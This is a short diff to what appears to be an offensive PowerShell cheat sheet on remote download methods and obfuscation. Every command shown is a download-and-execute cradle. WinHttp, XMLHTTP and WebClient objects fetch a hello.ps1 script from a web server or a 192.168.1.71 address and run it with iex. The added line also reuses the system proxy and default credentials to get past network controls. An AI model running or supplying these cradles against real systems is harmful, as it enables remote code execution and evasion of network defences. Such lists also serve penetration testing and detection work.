@@ -925,8 +925,11 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 <br />
 
-      $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://webserver/hello.ps1',$false);$h.send();iex $h.responseText
       $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://webserver/hello.ps1',$false);$h.send();iex $h.responseText
+
+      $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://webserver/hello.ps1',$false);$h.send();iex $h.responseText
+
+      $r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $r.downloadstring('http://192.168.1.71:8080/hello.ps1');
 
 ![powershell Additional Methods for Remote Download](http://i.cubeupload.com/tMG9I8.jpg)
 
